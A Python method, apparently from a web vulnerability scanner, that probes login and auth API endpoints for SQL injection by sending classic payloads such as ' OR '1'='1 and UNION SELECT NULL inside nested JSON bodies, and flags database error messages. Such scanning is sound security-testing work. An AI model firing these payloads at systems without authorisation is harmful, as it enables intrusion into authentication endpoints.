    def test_sqli_adv_json_nested(self):
        """SQLi via nested JSON body values."""
        if not self.deep: return
        self._print("[*]", "SQLi via nested JSON body values...", "INFO")
        try:
            payloads = ["' OR '1'='1", "1' OR '1'='1'-- -",
                        "1 UNION SELECT NULL-- -", "' OR 1=1#"]
            for ep in ["/api/login", "/api/auth", "/api/user",
                       "/api/v1/login", "/login", "/api/session"]:
                url = urljoin(self.target, ep)
                for p in payloads:
                    body = json.dumps({"user": {"profile": {"name": p}},
                                      "credentials": {"password": p}})
                    r = self._post(url, data=body,
                             headers={"Content-Type": "application/json"}, timeout=8)
                    if r is None: continue
                    txt = r.text or ""
                    for pat, db in self._EP9_SQLI_ERRS:
                        if re.search(pat, txt, re.I):
                            self._add_vuln("SQLi (nested JSON body)", "HIGH", url,
                                           f"payload={p} [{db}]", endpoint=ep,
                                           payload=p, dbms=db)
                            return
        except Exception:
            pass

